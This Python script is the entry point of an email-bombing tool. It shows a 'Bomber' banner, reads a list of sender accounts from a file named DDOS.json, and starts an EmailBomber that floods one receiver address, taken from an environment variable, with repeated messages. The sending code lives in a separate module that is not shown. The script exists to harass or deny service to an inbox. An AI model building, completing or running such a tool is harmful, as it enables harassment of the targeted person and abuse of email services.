from dotenv import load_dotenv
import pyfiglet
import colorama
import os
import json

from bombers import EmailBomber


def main():
	with open('../DDOS.json', 'r') as file:
		json_text = file.read()
		data = json.loads(json_text)

	email_bomber = EmailBomber(os.environ["RECEIVER_EMAIL"], "Hello World", 2, 5)
	email_bomber.start_DDOS_bombing(data['emails'])

if __name__ == '__main__':
	load_dotenv('../.env')
	colorama.init()
	print(colorama.Fore.RED + pyfiglet.figlet_format("Bomber", font="slant"))
	print(colorama.Style.RESET_ALL)
	main()
